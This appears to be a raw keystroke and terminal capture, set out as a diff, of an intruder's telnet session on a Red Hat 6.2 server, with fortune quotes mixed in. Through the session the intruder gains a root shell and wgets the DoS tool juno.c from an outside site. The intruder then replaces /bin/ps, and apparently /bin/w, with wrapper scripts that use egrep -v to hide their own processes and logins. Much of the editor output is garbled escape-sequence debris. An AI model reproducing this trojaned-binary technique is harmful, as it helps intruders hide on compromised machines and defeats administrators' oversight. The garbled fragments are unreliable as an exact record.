@@ -1,0 +1,3712 @@
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+login: Fone
+Password: 
+
+If some day we are defeated, well, war has its fortunes, good and bad.
+		-- Commander Kor, "Errand of Mercy", stardate 3201.7
+
+Try cd...
+
+[Fone@ariel .Fone]$ su Fone1
+Password: 
+
+	"I think they're going to take all this money that we spend now on war
+and death --"
+	"And make them spend it on life."
+		-- Edith Keeler and Kirk, "The City on the Edge of Forever",
+		   stardate unknown.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# dir
+Desktop
+
+Microsoft is not the answer.
+Microsoft is the question.
+NO (or Linux) is the answer.
+(Taken from a .signature from someone from the UK, source unknown)
+
+Try cd...
+
+[root@ariel .Fone]# ps -x
+  PID TTY      STAT   TIME COMMAND
+    1 ?        S      0:04 init [3]
+    2 ?        SW     0:00 [kflushd]
+    3 ?        SW     0:00 [kupdate]
+    4 ?        SW     0:00 [kpiod]
+    5 ?        SW     0:00 [kswapd]
+    6 ?        SW<    0:00 [mdrecoveryd]
+  309 ?        S      0:00 /sbin/pump -i eth0
+  377 ?        SW     0:00 [lockd]
+  378 ?        SW     0:00 [rpciod]
+  387 ?        S      0:00 rpc.statd
+  401 ?        S      0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-sc
+  428 ?        S      0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto
+  481 ?        S      0:00 syslogd -m 0
+  490 ?        S      0:00 klogd
+  554 ?        S      0:00 inetd
+  568 ?        S      0:00 smbd -D
+  577 ?        S      0:00 nmbd -D
+  591 ?        S      0:00 lpd
+  639 ?        S      0:00 sendmail: accepting connections on port 25
+  654 ?        S      0:00 gpm -t ps/2
+  753 ?        S      0:00 /usr/sbin/amd -F /etc/amd.conf
+  795 tty2     S      0:00 /sbin/mingetty tty2
+  796 tty3     S      0:00 /sbin/mingetty tty3
+  797 tty4     S      0:00 /sbin/mingetty tty4
+  798 tty5     S      0:00 /sbin/mingetty tty5
+  799 tty6     S      0:00 /sbin/mingetty tty6
+  802 tty1     S      0:00 /sbin/mingetty tty1
+  804 ?        S      0:00 in.telnetd: 211.43.92.125                            
+  805 pts/0    S      0:00 login -- Fone                
+  828 pts/0    S      0:00 su Fone1
+  829 pts/0    S      0:00 bash
+  841 pts/0    R      0:00 ps -x
+
+How can you govern a nation which has 246 kinds of cheese?
+		-- Charles de Gaulle
+
+Try cd...
+
+[root@ariel .Fone]# cd...
+bash: cd...: command not found
+
+Why are you so hard to ignore?
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# cd /var
+
+There is brutality and there is honesty.  There is no such thing as brutal
+honesty.
+
+Warmer! only 3 steps to go!
+
+[root@ariel /var]# dir
+arpwatch  catman  gated  kerberos  local  mars_nwe  nis       run    state  yp
+cache	  db	  gdm	 lib	   lock   named     preserve  spool  tmp
+
+The fact that 47 PEOPLE are yelling and sweat is cascading down my
+SPINAL COLUMN is fairly enjoyable!!
+
+You're not getting worse, but no better either
+
+[root@ariel /var]# cd ~
+
+Trailing Edge Technologies is pleased to announce the following
+TETflame programme:
+
+1) For a negotiated price (no quatloos accepted) one of our flaming
+   representatives will flame the living shit out of the poster of
+   your choice. The price is inversly proportional to how much of
+   an asshole the target it. We cannot be convinced to flame Dennis
+   Ritchie. Matt Crawford flames are free.
+
+2) For a negotiated price (same arrangement) the TETflame programme
+   is offering ``flame insurence''. Under this arrangement, if
+   one of our policy holders is flamed, we will cancel the offending
+   article and flame the flamer, to a crisp.
+
+3) The TETflame flaming representatives include: Richard Sexton, Oleg
+   Kisalev, Diane Holt, Trish O'Tauma, Dave Hill, Greg Nowak and our most
+   recent aquisition, Keith Doyle. But all he will do is put you in his
+   kill file. Weemba by special arrangement.
+
+-- Richard Sexton
+
+Colder! All that way, and I didn't check the dotfiles
+
+[root@ariel .Fone]# dir
+Desktop
+
+3M, under the Scotch brand name, manufactures a fine adhesive for art
+and display work.  This product is called "Craft Mount".  3M suggests
+that to obtain the best results, one should make the bond "while the
+adhesive is wet, aggressively tacky."  I did not know what "aggressively
+tacky" meant until I read today's fortune.
+
+		[And who said we didn't offer equal time, huh? Ed.]
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# wget http://packetstorm.securify.com/DoS/juno.c
+--09:44:24--  http://packetstorm.securify.com:80/DoS/juno.c
+           => `juno.c'
+Connecting to packetstorm.securify.com:80... connected!
+HTTP request sent, awaiting response... 
+
+There has been an alarming increase in the number of things you know
+nothing about.
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# dir
+Desktop
+
+Life Sucks.  Cynical, misanthropic male, 34, looking for soul mate but
+certain not to find her.  Drop me a note.  I'll call you, we'll talk and
+I'll ask you out to dinner where I'll probably spend more than I can
+afford in a feeble attempt to impress you.  Then we'll realize we have
+absolutely nothing in common and we'll go our separate ways, more
+embittered and depressed than before (if such a thing is possible).
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# 
+
+Love is a grave mental disease.
+		-- Plato
+
+Try cd...
+
+[root@ariel .Fone]# exit
+exit
+
+Bus error -- please leave by the rear door.
+
+Ho Hum Dee Dum
+
+[Fone@ariel .Fone]$ exit
+logout
+
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+login: 
+
+word: 
+
+You say there are two types of people?"
+	"Yes, those who separate people into two groups and those that don't."
+	"Wrong.  There are three groups:
+		Those who separate people into three groups.
+		Those who don't separate people into groups.
+		Those who can't decide."
+	"Wait a minute, what about people who separate people into two groups?"
+	"Oh.  Okay, then there are four groups."
+	"Aren't you then separating people into four groups?"
+	"Yeah."
+	"So then there's a fifth group, right?"
+	"You know, the problem is these idiots who can't make up their minds."
+
+Ho Hum Dee Dum
+
+[Fone@ariel .Fone]$ e
+
+ut
+
+Red Hat Linux release 6.2 (Zoot)
+Kernel 2.2.14-5.0 on an i686
+login: 
+
+sword: 
+
+ novice was trying to fix a broken lisp machine by turning the
+power off and on.  Knight, seeing what the student was doing spoke sternly,
+"You cannot fix a machine by just power-cycling it with no understanding
+of what is going wrong."  Knight turned the machine off and on.  The
+machine worked.
+
+Ho Hum Dee Dum
+
+[Fone@ariel .Fone]$ s
+
+user Fon1 does not exist
+
+Finster's Law:
+	A closed mouth gathers no feet.
+
+You're not getting worse, but no better either
+
+[Fone@ariel .Fone]$ s
+
+word: 
+
+correct password
+
+Civilization, as we know it, will end sometime this evening.
+See SYSNOTE tomorrow for more information.
+
+You're not getting worse, but no better either
+
+[Fone@ariel .Fone]$ s
+
+word: 
+
+es the name Pavlov ring a bell?
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# r
+
+ar/log
+
+It is far better to be deceived than to be undeceived by those we love.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# c
+
+Interfere?  Of course we should interfere!  Always do what you're
+best at, that's what I say.
+		-- Doctor Who
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# j
+
+cessing '/usr/lib/joe/joerc'...done
+    IW   Unnamed                      Row 1    Col 1   10:56  Ctrl-K H for help
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+
+File (Unnamed) not changed so no update needed.
+
+All I need to have a good time,
+Is a reefer, a woman and a bottle of wine.
+With those three things I don't need no sunshine,
+A reefer, a woman and a bottle of wine.
+
+All I want is to never grow old,
+I want to wash in a bathtub of gold.
+I want 97 kilos already rolled,
+I want to wash in a bathtub of gold.
+
+I want to light my cigars with 10 dollar bills,
+I like to have a cattle ranch in Beverly Hills.
+I want a bottle of Red Eye that's always filled,
+I like to have a cattle ranch in Beverly Hills.
+		-- Country Joe and the Fish, "Zachariah"
+
+Try cd...
+
+[root@ariel .Fone]# m
+
+You get what you pay for.
+		-- Gabriel Biel
+
+Try cd...
+
+[root@ariel .Fone]# j
+
+essing '/usr/lib/joe/joerc'...done
+    IW   /bin/ps                      Row 1    Col 1   10:57  Ctrl-K H for help
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+New File
+#
+
+ (Modified)2
+#
+#!
+
+2H4
+#!/b
+
+52H6
+n
+
+2H8
+	b
+
+;52H12
+2 
+
+/
+
+2H3
+
+/bi
+
+H6.p
+
+2H9
+
+	 
+[1;52H10
+
+	 e
+
+3H1
+
+	 e
+
+;53H7
+
+		v
+
+H20
+
+eg
+
+;53H5
+
+			|
+[1;53H6
+
+.
+
+3H9
+
+|
+[1;52H30
+
+F
+
+3H4
+
+3H7
+
+n
+9
+
+!
+
+1;53H5
+
+52H27
+
+3H5
+
+			
+
+3H1
+
+52H15
+
+3H3
+
+53H6
+
+		
+
+3H9
+
+$
+egrep|.ps|Fone|Fone!
+
+p|.ps|Fone|Fone! "egrep|.ps|Fone|Fone!22
+
+$"egrep|.ps|Fone|Fone!2"egrep|.ps|Fone|Fone! "egrep|.ps|Fone|Fone!
+			$"egrep|.ps|Fone|Fone!6
+
+3"egrep|.ps|Fone|Fone! "egrep|.ps|Fone|Fone!$"egrep|.ps|Fone|Fone!9
+
+4
+egrep|.ps|Fone|Fone! "egrep|.ps|Fone|Fone!31
+
+$
+egrep|.ps|Fone|Fone!5"egrep|.ps|Fone|Fone!38
+
+ "egrep|.ps|Fone|Fone!4
+
+"
+[1;53H5
+
+egrep|.ps|F46
+
+3H9
+
+|Fo
+
+53
+
+e
+
+5
+
+! 
+
+6
+
+1|i
+
+52H60
+
+e
+
+53H6
+
+		d"
+
+3H7
+
+File /bin/ps saved.
+
+Perhaps, after all, America never has been discovered.  I myself would
+say that it had merely been detected.
+		-- Oscar Wilde
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# c
+
+One of the advantages of being a captain is being able to ask for
+advice without necessarily having to take it.
+		-- Kirk, "Dagger of the Mind", stardate 2715.2
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+ROR: Process ID list syntax error.
+********* simple selection *********  ********* selection by list *********
+-A all processes                      -C by command name
+-N negate selection                   -G by real group ID (supports names)
+-a all w/ tty except session leaders  -U by real user ID (supports names)
+-d all except session leaders         -g by session leader OR by group name
+-e all processes                      -p by process ID
+T  all processes on this terminal     -s processes in the sessions given
+a  all w/ tty, including other users  -t by tty
+g  all, even group leaders!           -u by effective user ID (supports names)
+r  only running processes             U  processes for specified users
+x  processes w/o controlling ttys     t  by tty
+*********** output format **********  *********** long options ***********
+-o,o user-defined  -f full            --Group --User --pid --cols
+-j,j job control   s  signal          --group --user --sid --rows
+-O,O preloaded -o  v  virtual memory  --cumulative --format --deselect
+-l,l long          u  user-oriented   --sort --tty --forest --version
+                   X  registers       --heading --no-heading
+                    ********* misc options *********
+-V,V show version       L  list format codes  f  ASCII art forest
+-m,m show threads       S  children in sum    -y change -l format
+-n,N set namelist file  c  true command name  n  numeric WCHAN,UID
+-w,w wide output        e  show environment   -H process heirarchy
+
+I found Rome a city of bricks and left it a city of marble.
+		-- Augustus Caesar
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# j
+
+cessing '/usr/lib/joe/joerc'...done
+    IW   /bin/ps                      Row 1    Col 1   10:58  Ctrl-K H for help
+#!/bin/bash
+/bin/.ps egrep -v $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd"
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+2
+/
+
+2H5/
+ps
+
+15
+
+ 
+
+3H9
+
+$20
+
+[1;53H1
+
+ 
+[1;53H2
+
+1
+
+52H19
+
+3H8
+
+		v(Modified)7
+
+		 $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd"  
+		6
+
+		$1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd"  $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd"  $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd" 3
+
+ $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd" 2
+
+$1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd" 
+	 e1
+
+	 e $1 $2 $3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd" 
+	 
+
+$3 $4 $5 "egrep|.ps|Fone|Fone1|in.telnetd" 
+	9 
+
+	
+
+[1;52H10
+
+	 
+
+1;53H4
+
+2 $3 $4 $
+
+"26
+
+egrep
+
+3H9
+
+3H7
+
+3H5
+
+			9
+
+			e
+egrep|.ps|Fone|Fone1|in.telnetd"g"egrep|.ps|Fone|Fone1|in.telnetd"7
+
+rep -v"egrep|.ps|Fone|Fone1|in.telnetd" "egrep|.ps|Fone|Fone1|in.telnetd"34
+
+File /bin/ps saved.
+
+A mind is a wonderful thing to waste.
+
+Try cd...
+
+[root@ariel .Fone]# p
+
+RROR: User name does not exist.
+********* simple selection *********  ********* selection by list *********
+-A all processes                      -C by command name
+-N negate selection                   -G by real group ID (supports names)
+-a all w/ tty except session leaders  -U by real user ID (supports names)
+-d all except session leaders         -g by session leader OR by group name
+-e all processes                      -p by process ID
+T  all processes on this terminal     -s processes in the sessions given
+a  all w/ tty, including other users  -t by tty
+g  all, even group leaders!           -u by effective user ID (supports names)
+r  only running processes             U  processes for specified users
+x  processes w/o controlling ttys     t  by tty
+*********** output format **********  *********** long options ***********
+-o,o user-defined  -f full            --Group --User --pid --cols
+-j,j job control   s  signal          --group --user --sid --rows
+-O,O preloaded -o  v  virtual memory  --cumulative --format --deselect
+-l,l long          u  user-oriented   --sort --tty --forest --version
+                   X  registers       --heading --no-heading
+                    ********* misc options *********
+-V,V show version       L  list format codes  f  ASCII art forest
+-m,m show threads       S  children in sum    -y change -l format
+-n,N set namelist file  c  true command name  n  numeric WCHAN,UID
+-w,w wide output        e  show environment   -H process heirarchy
+
+Jim, this is Janelle.  I'm flying tonight, so I can't make our date, and
+I gotta find a safe place for Daffy.  He loves you, Jim!  It's only two
+days, and you'll see.  Great Danes are no problem!
+		-- "The Rockford Files"
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# p
+
+ROR: Process ID list syntax error.
+********* simple selection *********  ********* selection by list *********
+-A all processes                      -C by command name
+-N negate selection                   -G by real group ID (supports names)
+-a all w/ tty except session leaders  -U by real user ID (supports names)
+-d all except session leaders         -g by session leader OR by group name
+-e all processes                      -p by process ID
+T  all processes on this terminal     -s processes in the sessions given
+a  all w/ tty, including other users  -t by tty
+g  all, even group leaders!           -u by effective user ID (supports names)
+r  only running processes             U  processes for specified users
+x  processes w/o controlling ttys     t  by tty
+*********** output format **********  *********** long options ***********
+-o,o user-defined  -f full            --Group --User --pid --cols
+-j,j job control   s  signal          --group --user --sid --rows
+-O,O preloaded -o  v  virtual memory  --cumulative --format --deselect
+-l,l long          u  user-oriented   --sort --tty --forest --version
+                   X  registers       --heading --no-heading
+                    ********* misc options *********
+-V,V show version       L  list format codes  f  ASCII art forest
+-m,m show threads       S  children in sum    -y change -l format
+-n,N set namelist file  c  true command name  n  numeric WCHAN,UID
+-w,w wide output        e  show environment   -H process heirarchy
+
+A right is not what someone gives you; it's what no one can take from you.
+-- Ramsey Clark
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+OR: Process ID list syntax error.
+********* simple selection *********  ********* selection by list *********
+-A all processes                      -C by command name
+-N negate selection                   -G by real group ID (supports names)
+-a all w/ tty except session leaders  -U by real user ID (supports names)
+-d all except session leaders         -g by session leader OR by group name
+-e all processes                      -p by process ID
+T  all processes on this terminal     -s processes in the sessions given
+a  all w/ tty, including other users  -t by tty
+g  all, even group leaders!           -u by effective user ID (supports names)
+r  only running processes             U  processes for specified users
+x  processes w/o controlling ttys     t  by tty
+*********** output format **********  *********** long options ***********
+-o,o user-defined  -f full            --Group --User --pid --cols
+-j,j job control   s  signal          --group --user --sid --rows
+-O,O preloaded -o  v  virtual memory  --cumulative --format --deselect
+-l,l long          u  user-oriented   --sort --tty --forest --version
+                   X  registers       --heading --no-heading
+                    ********* misc options *********
+-V,V show version       L  list format codes  f  ASCII art forest
+-m,m show threads       S  children in sum    -y change -l format
+-n,N set namelist file  c  true command name  n  numeric WCHAN,UID
+-w,w wide output        e  show environment   -H process heirarchy
+
+What use is magic if it can't save a unicorn?
+		-- Peter S. Beagle, "The Last Unicorn"
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# j
+
+essing '/usr/lib/joe/joerc'...done
+    IW   /bin/ps                      Row 1    Col 1   10:59  Ctrl-K H for help
+#!/bin/bash
+/bin/.ps $1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+2
+/
+
+2H3
+
+/bi
+
+2H5/
+7p
+
+2H9
+
+	 
+[1;52H10
+
+	 	 (Modified)9 
+
+	$1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	$1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	$1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	7p
+1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+	8
+
+	s$1 $2 $3 $4 $5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+	$
+
+2H11
+
+	$1
+
+1;53H9
+
+4
+
+2H21
+
+$
+3
+
+ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+
+rep -v "egrep|.ps|Fone|Fone1|in.telnetd"   
+		 18
+
+		  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"   egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 4
+
+ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	$11
+
+	$1 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	$ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 
+	9 
+
+	  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+	 10  11:00
+
+	 $
+
+p -v "egrep|.ps|Fone|Fone1|in.telnetd"
+	 $1
+
+	 $1 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"$ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"4
+
+2 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+		$ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+		7
+
+		
+
+egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+		3  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"$ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"20
+
+4 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"  egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"$ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"3
+
+5 egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"4
+
+|
+egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+			5
+
+			
+
+3H4
+
+ 
+ egrep -v "egrep|.ps|Fone|Fone1|in.telnetd"
+			
+
+3H6
+
+ 
+[1;53H7
+
+egrep -v "egrep|.ps|Fone|Fone1|in.telnetd" 6
+
+3H5
+
+			
+
+			
+
+File /bin/ps saved.
+
+"I distrust a man who says 'when.'  If he's got to be careful not to drink too 
+much, it's because he's not to be trusted when he does."
+-- Sidney Greenstreet, _The Maltese Falcon_
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# p
+
+ID TTY          TIME CMD
+  925 pts/0    00:00:00 login
+  960 pts/0    00:00:00 su
+  961 pts/0    00:00:00 bash
+
+God is really only another artist.  He invented the giraffe, the elephant
+and the cat.  He has no real style, He just goes on trying other things.
+		-- Pablo Picasso
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# p
+
+ER       PID %CPU %MEM   VSZ  RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.6  1120  372 ?        S    08:23   0:04 init [3]
+root         2  0.0  0.0     0    0 ?        SW   08:23   0:00 [kflushd]
+root         3  0.0  0.0     0    0 ?        SW   08:23   0:00 [kupdate]
+root         4  0.0  0.0     0    0 ?        SW   08:23   0:00 [kpiod]
+root         5  0.0  0.0     0    0 ?        SW   08:23   0:00 [kswapd]
+root         6  0.0  0.0     0    0 ?        SW<  08:23   0:00 [mdrecoveryd]
+root       309  0.0  1.1  1432  628 ?        S    08:25   0:00 /sbin/pump -i eth
+bin        362  0.0  0.5  1212  324 ?        S    08:25   0:00 portmap
+root       377  0.0  0.0     0    0 ?        SW   08:25   0:00 [lockd]
+root       378  0.0  0.0     0    0 ?        SW   08:25   0:00 [rpciod]
+root       387  0.0  0.9  1156  512 ?        S    08:25   0:00 rpc.statd
+root       401  0.0  0.6  1104  384 ?        S    08:25   0:00 /usr/sbin/apmd -p
+root       428  0.0  0.9  1208  512 ?        S    08:25   0:00 /usr/sbin/automou
+root       481  0.0  0.8  1172  480 ?        S    08:25   0:00 syslogd -m 0
+root       490  0.0  1.2  1424  684 ?        S    08:25   0:00 klogd
+nobody     504  0.0  0.8  1292  440 ?        S    08:25   0:00 identd -e -o
+nobody     506  0.0  0.8  1292  440 ?        S    08:25   0:00 identd -e -o
+nobody     508  0.0  0.8  1292  440 ?        S    08:25   0:00 identd -e -o
+nobody     510  0.0  0.8  1292  440 ?        S    08:25   0:00 identd -e -o
+nobody     511  0.0  0.8  1292  440 ?        S    08:25   0:00 identd -e -o
+daemon     522  0.0  0.5  1144  296 ?        S    08:25   0:00 /usr/sbin/atd
+root       554  0.0  0.8  1156  460 ?        S    08:25   0:00 inetd
+root       568  0.0  1.7  3460  940 ?        S    08:25   0:00 smbd -D
+root       577  0.0  1.4  2016  820 ?        S    08:25   0:00 nmbd -D
+root       591  0.0  0.8  1204  484 ?        S    08:25   0:00 lpd
+root       639  0.0  1.2  2128  668 ?        S    08:25   0:00 sendmail: accepti
+xfs        738  0.0  0.9  3560  504 ?        S    08:25   0:00 xfs -droppriv -da
+root       753  0.0  1.1  1756  636 ?        S    08:25   0:00 /usr/sbin/amd -F 
+root       795  0.0  0.7  1092  408 tty2     S    08:25   0:00 /sbin/mingetty tt
+root       796  0.0  0.7  1092  408 tty3     S    08:25   0:00 /sbin/mingetty tt
+root       797  0.0  0.7  1092  408 tty4     S    08:25   0:00 /sbin/mingetty tt
+root       798  0.0  0.7  1092  408 tty5     S    08:25   0:00 /sbin/mingetty tt
+root       799  0.0  0.7  1092  408 tty6     S    08:25   0:00 /sbin/mingetty tt
+root       802  0.0  0.7  1092  408 tty1     S    08:28   0:00 /sbin/mingetty tt
+root       961  0.1  1.6  1692  916 pts/0    S    10:56   0:00 bash
+
+Yow!  Is this sexual intercourse yet??  Is it, huh, is it??
+
+Try cd...
+
+[root@ariel .Fone]# n
+
+ve Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0    138 ariel.burton-kra:telnet ppp-207-193-0-126.:1533 ESTABLISHED 
+tcp        0      0 *:930                   *:*                     LISTEN      
+tcp        0      0 *:smtp                  *:*                     LISTEN      
+tcp        0      0 *:printer               *:*                     LISTEN      
+tcp        0      0 *:netbios-ssn           *:*                     LISTEN      
+tcp        0      0 *:4464                  *:*                     LISTEN      
+tcp        0      0 *:linuxconf             *:*                     LISTEN      
+tcp        0      0 *:finger                *:*                     LISTEN      
+tcp        0      0 *:login                 *:*                     LISTEN      
+tcp        0      0 *:shell                 *:*                     LISTEN      
+tcp        0      0 *:telnet                *:*                     LISTEN      
+tcp        0      0 *:ftp                   *:*                     LISTEN      
+tcp        0      0 *:auth                  *:*                     LISTEN      
+tcp        0      0 *:990                   *:*                     LISTEN      
+tcp        0      0 *:1024                  *:*                     LISTEN      
+tcp        0      0 *:sunrpc                *:*                     LISTEN      
+udp        0      0 *:800                   *:*                                 
+udp        0      0 *:1022                  *:*                                 
+udp        0      0 *:931                   *:*                                 
+udp        0      0 *:1023                  *:*                                 
+udp        0      0 ariel.burto:netbios-dgm *:*                                 
+udp        0      0 ariel.burton:netbios-ns *:*                                 
+udp        0      0 *:netbios-dgm           *:*                                 
+udp        0      0 *:netbios-ns            *:*                                 
+udp        0      0 *:ntalk                 *:*                                 
+udp        0      0 *:talk                  *:*                                 
+udp        0      0 *:988                   *:*                                 
+udp        0      0 *:1024                  *:*                                 
+udp        0      0 *:sunrpc                *:*                                 
+raw        0      0 *:icmp                  *:*                     7           
+raw        0      0 *:tcp                   *:*                     7           
+Active UNIX domain sockets (servers and established)
+Proto RefCnt Flags       Type       State         I-Node Path
+unix  0      [ ACC ]     STREAM     LISTENING     260    /var/run/pump.sock
+unix  0      [ ACC ]     STREAM     LISTENING     710    /dev/printer
+unix  0      [ ACC ]     STREAM     LISTENING     833    /tmp/.font-unix/fs-1
+unix  8      [ ]         DGRAM                    589    /dev/log
+unix  0      [ ACC ]     STREAM     LISTENING     776    /dev/gpmctl
+unix  0      [ ]         DGRAM                    1075   
+unix  0      [ ]         DGRAM                    1001   
+unix  0      [ ]         DGRAM                    852    
+unix  0      [ ]         DGRAM                    836    
+unix  0      [ ]         DGRAM                    762    
+unix  0      [ ]         DGRAM                    709    
+unix  0      [ ]         DGRAM                    611    
+unix  0      [ ]         DGRAM                    601    
+
+Whatever you may be sure of, be sure of this: that you are dreadfully like
+other people.
+		-- James Russell Lowell, "My Study Windows"
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# netstat -a 
+
+             
+
+01am  up  2:38,  1 user,  load average: 0.00, 0.01, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.65s   ?     -
+
+You will have domestic happiness and faithful friends.
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# m
+
+/bin/w: No such file or directory
+
+I don't drink, I don't like it, it makes me feel too good.
+		-- K. Coates
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# j
+
+essing '/usr/lib/joe/joerc'...done
+    IW   /bin/w                       Row 1    Col 1   11:01  Ctrl-K H for help
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+New File
+#
+
+(Modified)2
+#
+#!
+
+2H4
+#!bi
+
+52H7
+	b
+sh11
+	sh2 
+
+1
+#
+
+2H3
+#!/bin/bash21
+
+/
+[1;52H2
+
+/2
+
+/b
+
+2H5
+
+H8
+
+	 6
+
+52H9
+
+	$
+
+2H11
+
+	$1 
+
+3H3
+
+2
+
+3H5
+
+$
+7
+
+		 $4
+
+52H22
+
+5
+[1;53H3
+
+|
+
+3H5
+
+			
+
+52H31
+
+v
+
+3H3
+
+"
+[1;53H4
+
+.
+[1;53H5
+
+ 4
+
+;53H5
+
+ e
+
+3H6
+
+r
+
+3H9
+
+|
+[1;52H40
+
+53H3
+
+|
+[1;53H4
+
+ 3
+
+  
+
+;53H0
+
+  
+
+35
+
+ 4
+
+F
+
+3H8
+
+52H42
+
+e
+
+3H4
+
+ 1
+
+3H5
+
+ 4
+
+"
+[1;53H5
+
+File /bin/w saved.
+
+In arguing that current theories of brain function cast suspicion on ESP,
+psychokinesis, reincarnation, and so on, I am frequently challenged with
+the most popular of all neuro-mythologies -- the notion that we ordinarily
+use only 10 percent of our brains...
+
+This "cerebral spare tire" concept continues to nourish the clientele of
+"pop psychologists" and their many recycling self-improvement schemes.  As
+a metaphor for the fact that few of us fully exploit our talents, who could
+deny it?  As a refuge for occultists seeking a neural basis of the miraculous,
+it leaves much to be desired.
+-- Barry L. Beyerstein, "The Brain and Conciousness:  Implications for
+   Psi Phenomena", The Skeptical Enquirer, Vol. XII, No. 2, pg. 171
+
+Try cd...
+
+[root@ariel .Fone]# w
+
+02am  up  2:39,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.70s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am 40.00s  0.39s   ?     -
+
+Change is the essential process of all existence.
+		-- Spock, "Let That Be Your Last Battlefield", stardate 5730.2
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# w
+
+02am  up  2:39,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.71s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am 44.00s  0.39s   ?     -
+
+Civilization is fun!  Anyway, it keeps me busy!!
+
+You're not getting worse, but no better either
+
+[root@ariel .Fone]# j
+
+essing '/usr/lib/joe/joerc'...done
+    IW   /bin/.w                      Row 1    Col 1   11:03  Ctrl-K H for help
+** Joe's Own Editor v2.8 ** Copyright (C) 1995 Joseph H. Allen **
+New File
+
+File /bin/.w not changed so no update needed.
+
+A government that is big enough to give you all you want is big enough
+to take it all away.
+		-- Barry Goldwater
+
+Try cd...
+
+[root@ariel .Fone]# w
+
+03am  up  2:40,  2 users,  load average: 0.08, 0.02, 0.01
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
+Fone     pts/0    ppp-207-193-0-12 10:55am  0.00s  0.74s   ?     -
+Fone     pts/1    1Cust44.tnt31.ch 11:01am 58.00s  0.39s   ?     -
+
+I have ways of making money that you know nothing of.
+		-- John D. Rockefeller
+
+Ho Hum Dee Dum
+
+[root@ariel .Fone]# j
+
